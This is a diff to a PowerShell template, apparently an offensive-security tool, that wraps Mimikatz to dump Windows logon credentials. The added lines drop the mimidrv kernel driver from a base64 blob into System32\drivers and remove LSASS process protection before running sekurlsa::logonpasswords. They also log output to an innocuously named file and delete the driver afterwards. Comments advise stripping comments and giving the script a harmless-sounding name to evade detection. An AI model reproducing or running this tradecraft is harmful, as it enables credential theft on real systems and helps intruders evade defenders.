@@ -13,16 +13,27 @@
    
     3. Strip comments and use a harmless-sounding name for the script
 
+    4. Use mimidrv from Mimikatz, or build your own and sign it
+    https://github.com/gentilkiwi/mimikatz
+    https://www.scip.ch/en/?labs.20190919
+
 #>
 
 Function FormerlyKnownAsMimikatz {
     # <add the script here>
 }
 
+# Driver - Base64 encoded
+$BlobDriver = "<add base64 string here>"
+$PathDriver = "$env:SystemRoot\System32\drivers\mimidrv.sys"
+
 # Log
 $TargetBasePath = "Windows"
 $TargetLogName = "de-ch.log"
 $TargetLogLocalPath = "C:\$TargetBasePath\$TargetLogName"
 
-# Run Payload
-FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug sekurlsa::logonpasswords"
+# Deploy Driver, Run Mimikatz (remove LSASS protection)
+cd "$env:SystemRoot\System32\drivers"
+[IO.File]::WriteAllBytes($PathDriver, [Convert]::FromBase64String($BlobDriver))
+FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug !+ ""!processprotect /remove /process:lsass.exe"" sekurlsa::logonpasswords !-"
+Remove-Item $PathDriver
